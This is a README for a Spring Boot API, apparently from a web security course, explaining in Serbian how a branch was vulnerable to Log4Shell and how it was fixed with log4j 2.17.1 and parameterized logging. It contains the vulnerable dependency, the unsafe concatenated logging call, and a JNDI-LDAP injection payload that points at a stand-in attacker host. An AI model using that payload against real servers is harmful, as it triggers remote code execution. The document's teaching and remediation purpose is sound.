# websec-api

Spring Boot REST API za WebSec aplikaciju.

## Grana: vuln/log4j

### Problem - Log4Shell (CVE-2021-44228)

Na grani vuln/log4j class repoa, aplikacija je koristila ranjivu verziju Log4j:

  <dependency>
      <groupId>org.apache.logging.log4j</groupId>
      <artifactId>log4j-core</artifactId>
      <version>2.14.1</version>  <!-- ranjivo -->
  </dependency>

Pored toga, log poruke su formirane string concatenation-om:

  log.info("Review Controller: User:" + user.getEmail()
           + " requested an update for review with id: " + reviewId
           + " and text:" + updateReviewRequest.getReviewText());

Log4j2 < 2.15.0 evaluira ${...} izraze unutar log poruka (message lookup
substitution). Ako napadac u polje reviewText unese:
  ${jndi:ldap://napadac.com/exploit}
...log4j ce se konektovati na LDAP server napadaca i preuzeti i izvrsiti
malicioznu Java klasu -> Remote Code Execution (RCE).

### Resenje

#### Fix 1 - verzija dependency-a

U pom.xml je dodat:
  <log4j2.version>2.17.1</log4j2.version>

Ovo forsira Spring Boot da koristi log4j-core 2.17.1 umesto ranjive verzije.
U verzijama >= 2.16.0 JNDI lookups su onemoguceni po defaultu.
U verzijama >= 2.17.0 message lookup substitution je potpuno uklonjen.

#### Fix 2 - parametrizovano logovanje

RANJIVO (string concatenation):
  log.info("User " + email + " requested movie " + id);

BEZBEDNO (parameterized):
  log.info("User {} requested movie {}", email, id);

Kod parameterized logovana, user-controlled vrednost se prosledjuje kao
poseban argument i nikad se ne evaluira kao deo message pattern-a.
Log4j tretira {} kao placeholder za podatak, ne kao komandu.

### Izmenjeni fajlovi

- pom.xml (log4j2.version property + eksplicitan log4j-core 2.17.1)
- api/MovieController.java (komentar koji objasnjava fix)

### Pokretanje

./mvnw clean package -DskipTests
java -jar target/web-security.jar

Swagger UI: http://localhost:8080/swagger-ui/index.html
